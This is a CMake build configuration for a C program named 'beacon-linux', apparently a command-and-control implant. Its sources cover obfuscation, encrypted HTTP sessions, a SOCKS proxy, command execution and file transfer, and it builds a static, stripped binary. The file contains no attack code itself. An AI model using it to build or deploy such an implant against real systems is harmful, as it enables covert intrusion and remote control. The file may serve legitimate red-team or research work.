cmake_minimum_required(VERSION 3.16)
project(beacon-linux C)

set(CMAKE_C_STANDARD 11)

set(ENABLE_TESTING OFF CACHE BOOL "" FORCE)
set(ENABLE_PROGRAMS OFF CACHE BOOL "" FORCE)
set(MBEDTLS_FATAL_WARNINGS OFF CACHE BOOL "" FORCE)

add_subdirectory(deps/mbedtls)

add_executable(beacon-linux
    src/main.c
    src/util/obf.c
    src/protocol/message.c
    src/protocol/crypto.c
    src/comms/http.c
    src/comms/session.c
    src/comms/socks.c
    src/exec/exec.c
    src/exec/builtin.c
    src/transfer/transfer.c
)

target_include_directories(beacon-linux PRIVATE
    ${CMAKE_CURRENT_SOURCE_DIR}/include
    ${CMAKE_CURRENT_SOURCE_DIR}/src
    ${CMAKE_CURRENT_SOURCE_DIR}/deps/mbedtls/include
)

target_link_libraries(beacon-linux PRIVATE
    mbedtls
    mbedx509
    mbedcrypto
    pthread
)

set_target_properties(beacon-linux PROPERTIES OUTPUT_NAME "beacon.elf")
target_compile_options(beacon-linux PRIVATE -Os -Wall -Wextra -Wno-unused-parameter)
target_link_options(beacon-linux PRIVATE -static -s)
